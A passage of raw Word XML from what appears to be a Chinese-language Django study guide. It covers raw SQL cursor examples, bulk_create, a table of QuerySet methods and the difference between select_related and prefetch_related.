          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>普京</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>' WHERE name='</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>特朗普</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">'")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A062D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cursor.execute("delete from hello_author where name='</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>普京</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">'")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20FDA8A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cursor.execute("select * from hello_author")  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E3CE05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cursor.fetchone()  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4078691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cursor.fetchall() </w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="31686778" w14:textId="5C6619D2" w:rsidR="00024E97" w:rsidRDefault="00FC55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lastRenderedPageBreak/>
        <w:t>013</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如何使用</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>Django ORM</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>批量创建数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D563BD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中级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ORM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40435BE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可以使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
          <w:bdr w:val="single" w:sz="6" w:space="0" w:color="E7EAED"/>
          <w:shd w:val="clear" w:color="auto" w:fill="F3F4F4"/>
        </w:rPr>
        <w:t>django.db.models.query.QuerySet.bulk_create()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>批量创建对象，减少</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>查询次数。</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例子如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7328DBB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创建一个空列表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0181196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querysetlist=[]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50B840E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把创建的对象添加入列表中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479E0E5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for i in resultlist:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15992F0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querysetlist.append(Account(name=i))    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AD9F9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批量创建</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FD1513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Account.objects.bulk_create(querysetlist)</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="6C252BCD" w14:textId="41477A7D" w:rsidR="00024E97" w:rsidRDefault="00FC55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014</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列举</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>django ORM</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>中操作</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>QuerySet</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>对象的方法</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>至少</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>个</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="690E5799"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初级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ORM</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="12000" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1950"/>
        <w:gridCol w:w="10050"/>
      </w:tblGrid>
      <w:tr w:rsidR="00024E97" w14:paraId="50CB9D8F" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:tblHeader/>
          <w:jc w:val="center"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="195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664379CC" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:spacing w:line="300" w:lineRule="exact"/>
              <w:contextualSpacing/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>方法</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1005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45A4728E" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="002437D1">
            <w:pPr>
              <w:widowControl/>
              <w:spacing w:line="300" w:lineRule="exact"/>
              <w:contextualSpacing/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>作用</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="140EEDCD"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E6846F9"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all()</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17797FE"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查询所有结果</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="72C7AF0C"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BC59523"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filter()</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05F71405"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过滤查询对象。获取不到返回None。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="474CF1D6"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1935824"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get()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CA955CA"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返回与所给筛选条件相匹配的对象，返回结果有且只有1个。如果符合筛选条件的对象超过1个或者没有都会抛出错误。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="44999DDB"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DE67535"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exclude()</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D2B639F"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排除满足条件的对象</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="6FDF905B"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449C541"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order_by()</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D2141A1"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对查询结果排序</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="2B4A8D55"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EB1EF36"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reverse()</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B32EA12"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对查询结果反向排序</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="25A468A8"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61CB2B8"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count()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6012990"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返回数据库中匹配查询(QuerySet)的对象数量。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="5F991156"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F4FCBE0"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first()</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34D17DC"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返回第一条记录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="30C1C933"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E3AF5D9"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last()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6F64500"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返回最后一条记录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="23CB1EC2"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55065D9"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exists()</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85FF1C6"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如果QuerySet包含数据，就返回True，否则返回False</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="73DFA1E3"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267CC8C"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values()</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31EE90F"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返回包含对象具体值的字典的QuerySet</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="533BE611"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5527F91"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lastRenderedPageBreak/>
              <w:t>values_list()</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8F4D27E"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与values()类似，只是返回的是元组而不是字典。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00024E97" w14:paraId="6AA31A4D" w14:textId="77777777" w:rsidTr="00077AF1">
        <w:trPr>
          <w:jc w:val="center"/>
        </w:trPr>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BF60027"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distinct()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770BA2C" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="002437D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对查询集去重</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6095735F" w14:textId="10F1135B" w:rsidR="00024E97" w:rsidRDefault="00467BDF"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018</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>selected_related</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>prefetch_related</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>有什么区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6077E4C4" w14:textId="77777777" w:rsidR="00024E97" w:rsidRPr="00467BDF" w:rsidRDefault="00024E97" w:rsidP="00467BDF">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Cs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>在</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中当创建一个查询集的时候，并没有跟数据库发生任何交互。因此我们可以对查询集进行级联的</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>等操作，只有在访问</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Queryset</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>的内容的时候，</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>才会真正进行数据库的访问。而多频率、复杂的数据库查询往往是性能问题最大的根源。</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72902A90" w14:textId="77777777" w:rsidR="00024E97" w:rsidRPr="00467BDF" w:rsidRDefault="00024E97" w:rsidP="00467BDF">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Cs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>不过我们实际开发中，往往需要访问到外键对象的其他属性。如果按照默认的查询方式去遍历取值，那么会造成多次的数据库查询，效率可想而知。</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FBDBDB7" w14:textId="77777777" w:rsidR="00024E97" w:rsidRPr="00467BDF" w:rsidRDefault="00024E97" w:rsidP="00467BDF">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Cs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>在查询对象集合的时候，把指定的外键对象也一并完整查询加载，避免后续的重复查询。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D23E26E" w14:textId="77777777" w:rsidR="00024E97" w:rsidRPr="00467BDF" w:rsidRDefault="00024E97" w:rsidP="00467BDF">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Cs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> select_related() </w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> prefetch_related() </w:t>
      </w:r>
      <w:r w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>可以很好的减少数据库请求的次数，从而提高性能。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74B284B4" w14:textId="7776587D" w:rsidR="00024E97" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">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Cs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>select_related</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>适用于一对一字段（</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>OneToOneField</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>）和外键字段（</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ForeignKey</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>）查询；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F99D90F" w14:textId="7EC91A59" w:rsidR="00024E97" w:rsidRPr="00467BDF" w:rsidRDefault="00467BDF" w:rsidP="00467BDF">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Cs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体" w:hint="eastAsia"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>prefetch_related</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>适用多对多字段（</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ManyToManyField</w:t>
      </w:r>
      <w:r w:rsidR="00024E97" w:rsidRPr="00467BDF">
        <w:rPr>
